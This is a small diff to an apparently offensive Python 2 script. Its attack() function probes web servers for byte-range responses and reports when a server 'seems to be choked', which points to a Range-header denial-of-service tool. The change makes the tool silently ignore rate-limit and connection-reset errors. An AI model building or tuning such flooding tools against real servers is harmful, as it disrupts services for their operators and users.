@@ -54,7 +54,9 @@ def attack(url, user_agent=None, method='GET', proxy=None):
             if check:
                 return response and ('byteranges' in repr(response.headers.headers) or response.code == 206)
         except urllib2.URLError, msg:
-            if 'timed out' in str(msg):
+            if any([item in str(msg) for item in ('Too many', 'Connection reset')]):
+                pass
+            elif 'timed out' in str(msg):
                 print "\r(i) Server seems to be choked ('%s')" % msg
             else:
                 print "(x) Connection error ('%s')" % msg
